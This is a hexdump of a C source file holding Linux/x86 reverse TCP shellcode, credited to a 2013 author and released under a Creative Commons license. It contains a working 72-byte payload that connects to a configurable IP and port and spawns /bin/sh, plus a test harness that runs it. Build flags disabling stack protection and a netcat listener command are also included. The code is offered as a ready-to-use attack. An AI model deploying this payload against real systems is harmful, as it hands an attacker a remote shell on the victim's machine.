00000000  2f 2a 0d 0a 0d 0a 20 53  68 65 6c 6c 20 52 65 76  |/*.... Shell Rev|
00000010  65 72 73 65 20 54 43 50  20 53 68 65 6c 6c 63 6f  |erse TCP Shellco|
00000020  64 65 20 2d 20 43 20 4c  61 6e 67 75 61 67 65 0d  |de - C Language.|
00000030  0a 20 4c 69 6e 75 78 2f  78 38 36 0d 0a 0d 0a 20  |. Linux/x86.... |
00000040  57 72 69 74 74 65 6e 20  69 6e 20 32 30 31 33 20  |Written in 2013 |
00000050  62 79 20 47 65 79 73 6c  61 6e 20 47 2e 20 42 65  |by Geyslan G. Be|
00000060  6d 2c 20 48 61 63 6b 69  6e 67 20 62 69 74 73 0d  |m, Hacking bits.|
00000070  0a 0d 0a 20 20 20 68 74  74 70 3a 2f 2f 68 61 63  |...   http://hac|
00000080  6b 69 6e 67 62 69 74 73  2e 63 6f 6d 0d 0a 20 20  |kingbits.com..  |
00000090  20 67 65 79 73 6c 61 6e  40 67 6d 61 69 6c 2e 63  | geyslan@gmail.c|
000000a0  6f 6d 0d 0a 0d 0a 20 54  68 69 73 20 73 6f 75 72  |om.... This sour|
000000b0  63 65 20 69 73 20 6c 69  63 65 6e 73 65 64 20 75  |ce is licensed u|
000000c0  6e 64 65 72 20 74 68 65  20 43 72 65 61 74 69 76  |nder the Creativ|
000000d0  65 20 43 6f 6d 6d 6f 6e  73 0d 0a 20 41 74 74 72  |e Commons.. Attr|
000000e0  69 62 75 74 69 6f 6e 2d  53 68 61 72 65 41 6c 69  |ibution-ShareAli|
000000f0  6b 65 20 33 2e 30 20 42  72 61 7a 69 6c 20 4c 69  |ke 3.0 Brazil Li|
00000100  63 65 6e 73 65 2e 0d 0a  0d 0a 20 54 6f 20 76 69  |cense..... To vi|
00000110  65 77 20 61 20 63 6f 70  79 20 6f 66 20 74 68 69  |ew a copy of thi|
00000120  73 20 6c 69 63 65 6e 73  65 2c 20 76 69 73 69 74  |s license, visit|
00000130  0d 0a 0d 0a 20 20 20 68  74 74 70 3a 2f 2f 63 72  |....   http://cr|
00000140  65 61 74 69 76 65 63 6f  6d 6d 6f 6e 73 2e 6f 72  |eativecommons.or|
00000150  67 2f 6c 69 63 65 6e 73  65 73 2f 62 79 2d 73 61  |g/licenses/by-sa|
00000160  2f 33 2e 30 2f 0d 0a 0d  0a 20 59 6f 75 20 61 72  |/3.0/.... You ar|
00000170  65 20 66 72 65 65 3a 0d  0a 0d 0a 20 20 20 20 74  |e free:....    t|
00000180  6f 20 53 68 61 72 65 20  2d 20 74 6f 20 63 6f 70  |o Share - to cop|
00000190  79 2c 20 64 69 73 74 72  69 62 75 74 65 20 61 6e  |y, distribute an|
000001a0  64 20 74 72 61 6e 73 6d  69 74 20 74 68 65 20 77  |d transmit the w|
000001b0  6f 72 6b 0d 0a 20 20 20  20 74 6f 20 52 65 6d 69  |ork..    to Remi|
000001c0  78 20 2d 20 74 6f 20 61  64 61 70 74 20 74 68 65  |x - to adapt the|
000001d0  20 77 6f 72 6b 0d 0a 20  20 20 20 74 6f 20 6d 61  | work..    to ma|
000001e0  6b 65 20 63 6f 6d 6d 65  72 63 69 61 6c 20 75 73  |ke commercial us|
000001f0  65 20 6f 66 20 74 68 65  20 77 6f 72 6b 0d 0a 0d  |e of the work...|
00000200  0a 20 55 6e 64 65 72 20  74 68 65 20 66 6f 6c 6c  |. Under the foll|
00000210  6f 77 69 6e 67 20 63 6f  6e 64 69 74 69 6f 6e 73  |owing conditions|
00000220  3a 0d 0a 20 20 20 41 74  74 72 69 62 75 74 69 6f  |:..   Attributio|
00000230  6e 20 2d 20 59 6f 75 20  6d 75 73 74 20 61 74 74  |n - You must att|
00000240  72 69 62 75 74 65 20 74  68 65 20 77 6f 72 6b 20  |ribute the work |
00000250  69 6e 20 74 68 65 20 6d  61 6e 6e 65 72 0d 0a 20  |in the manner.. |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000270  73 70 65 63 69 66 69 65  64 20 62 79 20 74 68 65  |specified by the|
00000280  20 61 75 74 68 6f 72 20  6f 72 20 6c 69 63 65 6e  | author or licen|
00000290  73 6f 72 20 28 62 75 74  0d 0a 20 20 20 20 20 20  |sor (but..      |
000002a0  20 20 20 20 20 20 20 20  20 20 20 6e 6f 74 20 69  |           not i|
000002b0  6e 20 61 6e 79 20 77 61  79 20 74 68 61 74 20 73  |n any way that s|
000002c0  75 67 67 65 73 74 73 20  74 68 61 74 20 74 68 65  |uggests that the|
000002d0  79 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |y..             |
000002e0  20 20 20 20 65 6e 64 6f  72 73 65 20 79 6f 75 20  |    endorse you |
000002f0  6f 72 20 79 6f 75 72 20  75 73 65 20 6f 66 20 74  |or your use of t|
00000300  68 65 20 77 6f 72 6b 29  2e 0d 0a 0d 0a 20 20 20  |he work).....   |
00000310  53 68 61 72 65 20 41 6c  69 6b 65 20 2d 20 49 66  |Share Alike - If|
00000320  20 79 6f 75 20 61 6c 74  65 72 2c 20 74 72 61 6e  | you alter, tran|
00000330  73 66 6f 72 6d 2c 20 6f  72 20 62 75 69 6c 64 20  |sform, or build |
00000340  75 70 6f 6e 0d 0a 20 20  20 20 20 20 20 20 20 20  |upon..          |
00000350  20 20 20 20 20 20 20 74  68 69 73 20 77 6f 72 6b  |       this work|
00000360  2c 20 79 6f 75 20 6d 61  79 20 64 69 73 74 72 69  |, you may distri|
00000370  62 75 74 65 20 74 68 65  0d 0a 20 20 20 20 20 20  |bute the..      |
00000380  20 20 20 20 20 20 20 20  20 20 20 72 65 73 75 6c  |           resul|
00000390  74 69 6e 67 20 77 6f 72  6b 20 6f 6e 6c 79 20 75  |ting work only u|
000003a0  6e 64 65 72 20 74 68 65  20 73 61 6d 65 20 6f 72  |nder the same or|
000003b0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000003c0  20 20 20 73 69 6d 69 6c  61 72 20 6c 69 63 65 6e  |   similar licen|
000003d0  73 65 20 74 6f 20 74 68  69 73 20 6f 6e 65 2e 0d  |se to this one..|
000003e0  0a 0d 0a 2a 2f 0d 0a 0d  0a 2f 2a 0d 0a 0d 0a 20  |...*/..../*.... |
000003f0  73 68 65 6c 6c 5f 72 65  76 65 72 73 65 5f 74 63  |shell_reverse_tc|
00000400  70 5f 73 68 65 6c 6c 63  6f 64 65 0d 0a 0d 0a 20  |p_shellcode.... |
00000410  2a 20 37 32 20 62 79 74  65 73 0d 0a 20 2a 20 6e  |* 72 bytes.. * n|
00000420  75 6c 6c 2d 62 79 74 65  73 20 66 72 65 65 20 69  |ull-bytes free i|
00000430  66 20 74 68 65 20 70 6f  72 74 20 61 6e 64 20 61  |f the port and a|
00000440  64 64 72 65 73 73 20 61  72 65 0d 0a 20 2a 20 74  |ddress are.. * t|
00000450  68 65 20 69 70 20 61 64  64 72 65 73 73 20 61 6e  |he ip address an|
00000460  64 20 70 6f 72 74 20 6e  75 6d 62 65 72 20 61 72  |d port number ar|
00000470  65 20 65 61 73 69 6c 79  20 63 68 61 6e 67 65 61  |e easily changea|
00000480  62 6c 65 20 28 32 6e 64  20 74 6f 20 35 74 68 20  |ble (2nd to 5th |
00000490  62 79 74 65 73 20 61 72  65 20 74 68 65 20 49 50  |bytes are the IP|
000004a0  29 20 61 6e 64 20 28 39  74 68 20 61 6e 64 20 31  |) and (9th and 1|
000004b0  30 74 68 20 61 72 65 20  74 68 65 20 50 6f 72 74  |0th are the Port|
000004c0  29 0d 0a 20 0d 0a 0d 0a  20 23 20 67 63 63 20 2d  |).. .... # gcc -|
000004d0  6d 33 32 20 2d 66 6e 6f  2d 73 74 61 63 6b 2d 70  |m32 -fno-stack-p|
000004e0  72 6f 74 65 63 74 6f 72  20 2d 7a 20 65 78 65 63  |rotector -z exec|
000004f0  73 74 61 63 6b 20 73 68  65 6c 6c 63 6f 64 65 2e  |stack shellcode.|
00000500  63 20 2d 6f 20 73 68 65  6c 6c 63 6f 64 65 0d 0a  |c -o shellcode..|
00000510  20 23 20 2e 2f 73 68 65  6c 6c 63 6f 64 65 0d 0a  | # ./shellcode..|
00000520  0d 0a 20 54 65 73 74 69  6e 67 0d 0a 20 23 20 6e  |.. Testing.. # n|
00000530  63 20 2d 6c 20 31 32 37  2e 31 2e 31 2e 31 20 35  |c -l 127.1.1.1 5|
00000540  35 35 35 35 0d 0a 20 23  20 2e 2f 73 68 65 6c 6c  |5555.. # ./shell|
00000550  63 6f 64 65 20 0d 0a 0d  0a 2a 2f 0d 0a 0d 0a 23  |code ....*/....#|
00000560  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
00000570  3e 0d 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 72  |>..#include <str|
00000580  69 6e 67 2e 68 3e 0d 0a  0d 0a 75 6e 73 69 67 6e  |ing.h>....unsign|
00000590  65 64 20 63 68 61 72 20  63 6f 64 65 5b 5d 20 3d  |ed char code[] =|
000005a0  20 5c 0d 0a 0d 0a 22 5c  78 36 38 22 0d 0a 22 5c  | \...."\x68".."\|
000005b0  78 37 66 5c 78 30 31 5c  78 30 31 5c 78 30 31 22  |x7f\x01\x01\x01"|
000005c0  20 20 2f 2f 20 3c 2d 20  49 50 20 4e 75 6d 62 65  |  // <- IP Numbe|
000005d0  72 20 22 31 32 37 2e 31  2e 31 2e 31 22 0d 0a 22  |r "127.1.1.1".."|
000005e0  5c 78 35 65 5c 78 36 36  5c 78 36 38 22 0d 0a 22  |\x5e\x66\x68".."|
000005f0  5c 78 64 39 5c 78 30 33  22 20 20 20 20 20 20 20  |\xd9\x03"       |
00000600  20 20 20 2f 2f 20 3c 2d  20 50 6f 72 74 20 4e 75  |   // <- Port Nu|
00000610  6d 62 65 72 20 22 35 35  35 35 35 22 0d 0a 22 5c  |mber "55555".."\|
00000620  78 35 66 5c 78 36 61 5c  78 36 36 5c 78 35 38 5c  |x5f\x6a\x66\x58\|
00000630  78 39 39 5c 78 36 61 5c  78 30 31 5c 78 35 62 5c  |x99\x6a\x01\x5b\|
00000640  78 35 32 5c 78 35 33 5c  78 36 61 5c 78 30 32 22  |x52\x53\x6a\x02"|
00000650  0d 0a 22 5c 78 38 39 5c  78 65 31 5c 78 63 64 5c  |.."\x89\xe1\xcd\|
00000660  78 38 30 5c 78 39 33 5c  78 35 39 5c 78 62 30 5c  |x80\x93\x59\xb0\|
00000670  78 33 66 5c 78 63 64 5c  78 38 30 5c 78 34 39 5c  |x3f\xcd\x80\x49\|
00000680  78 37 39 22 0d 0a 22 5c  78 66 39 5c 78 62 30 5c  |x79".."\xf9\xb0\|
00000690  78 36 36 5c 78 35 36 5c  78 36 36 5c 78 35 37 5c  |x66\x56\x66\x57\|
000006a0  78 36 36 5c 78 36 61 5c  78 30 32 5c 78 38 39 5c  |x66\x6a\x02\x89\|
000006b0  78 65 31 5c 78 36 61 22  0d 0a 22 5c 78 31 30 5c  |xe1\x6a".."\x10\|
000006c0  78 35 31 5c 78 35 33 5c  78 38 39 5c 78 65 31 5c  |x51\x53\x89\xe1\|
000006d0  78 63 64 5c 78 38 30 5c  78 62 30 5c 78 30 62 5c  |xcd\x80\xb0\x0b\|
000006e0  78 35 32 5c 78 36 38 5c  78 32 66 22 0d 0a 22 5c  |x52\x68\x2f".."\|
000006f0  78 32 66 5c 78 37 33 5c  78 36 38 5c 78 36 38 5c  |x2f\x73\x68\x68\|
00000700  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 36 65 5c  |x2f\x62\x69\x6e\|
00000710  78 38 39 5c 78 65 33 5c  78 35 32 5c 78 35 33 22  |x89\xe3\x52\x53"|
00000720  0d 0a 22 5c 78 65 62 5c  78 63 65 22 3b 0d 0a 0d  |.."\xeb\xce";...|
00000730  0a 6d 61 69 6e 20 28 29  0d 0a 7b 0d 0a 0d 0a 20  |.main ()..{.... |
00000740  20 20 20 20 20 20 20 2f  2f 20 57 68 65 6e 20 74  |       // When t|
00000750  68 65 20 49 50 20 63 6f  6e 74 61 69 6e 73 20 6e  |he IP contains n|
00000760  75 6c 6c 2d 62 79 74 65  73 2c 20 70 72 69 6e 74  |ull-bytes, print|
00000770  66 20 77 69 6c 6c 20 73  68 6f 77 20 61 20 77 72  |f will show a wr|
00000780  6f 6e 67 20 73 68 65 6c  6c 63 6f 64 65 20 6c 65  |ong shellcode le|
00000790  6e 67 74 68 2e 0d 0a 0d  0a 09 70 72 69 6e 74 66  |ngth......printf|
000007a0  28 22 53 68 65 6c 6c 63  6f 64 65 20 4c 65 6e 67  |("Shellcode Leng|
000007b0  74 68 3a 20 20 25 64 5c  6e 22 2c 20 73 74 72 6c  |th:  %d\n", strl|
000007c0  65 6e 28 63 6f 64 65 29  29 3b 0d 0a 0d 0a 09 2f  |en(code));...../|
000007d0  2f 20 50 6f 6c 6c 75 74  65 73 20 61 6c 6c 20 72  |/ Pollutes all r|
000007e0  65 67 69 73 74 65 72 73  20 65 6e 73 75 72 69 6e  |egisters ensurin|
000007f0  67 20 74 68 61 74 20 74  68 65 20 73 68 65 6c 6c  |g that the shell|
00000800  63 6f 64 65 20 72 75 6e  73 20 69 6e 20 61 6e 79  |code runs in any|
00000810  20 63 69 72 63 75 6d 73  74 61 6e 63 65 2e 0d 0a  | circumstance...|
00000820  0d 0a 09 5f 5f 61 73 6d  5f 5f 20 28 22 6d 6f 76  |...__asm__ ("mov|
00000830  6c 20 24 30 78 66 66 66  66 66 66 66 66 2c 20 25  |l $0xffffffff, %|
00000840  65 61 78 5c 6e 5c 74 22  0d 0a 09 09 20 22 6d 6f  |eax\n\t".... "mo|
00000850  76 6c 20 25 65 61 78 2c  20 25 65 62 78 5c 6e 5c  |vl %eax, %ebx\n\|
00000860  74 22 0d 0a 09 09 20 22  6d 6f 76 6c 20 25 65 61  |t".... "movl %ea|
00000870  78 2c 20 25 65 63 78 5c  6e 5c 74 22 0d 0a 09 09  |x, %ecx\n\t"....|
00000880  20 22 6d 6f 76 6c 20 25  65 61 78 2c 20 25 65 64  | "movl %eax, %ed|
00000890  78 5c 6e 5c 74 22 0d 0a  09 09 20 22 6d 6f 76 6c  |x\n\t".... "movl|
000008a0  20 25 65 61 78 2c 20 25  65 73 69 5c 6e 5c 74 22  | %eax, %esi\n\t"|
000008b0  0d 0a 09 09 20 22 6d 6f  76 6c 20 25 65 61 78 2c  |.... "movl %eax,|
000008c0  20 25 65 64 69 5c 6e 5c  74 22 0d 0a 09 09 20 22  | %edi\n\t".... "|
000008d0  6d 6f 76 6c 20 25 65 61  78 2c 20 25 65 62 70 22  |movl %eax, %ebp"|
000008e0  29 3b 0d 0a 0d 0a 09 69  6e 74 20 28 2a 72 65 74  |);.....int (*ret|
000008f0  29 28 29 20 3d 20 28 69  6e 74 28 2a 29 28 29 29  |)() = (int(*)())|
00000900  63 6f 64 65 3b 0d 0a 0d  0a 09 72 65 74 28 29 3b  |code;.....ret();|
00000910  0d 0a 0d 0a 7d                                    |....}|
00000915
